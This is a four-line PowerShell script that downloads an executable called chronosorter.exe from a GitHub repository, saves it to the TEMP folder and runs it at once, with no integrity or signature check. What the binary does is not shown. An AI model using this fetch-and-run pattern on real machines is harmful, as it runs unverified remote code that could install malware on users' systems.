$exeUrl = "https://github.com/DomainTyler/.exe-.ps1-vault/raw/main/chronosorter.exe"
$tempPath = "$env:TEMP\chronosorter.exe"

Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath
Start-Process -FilePath $tempPath -Wait
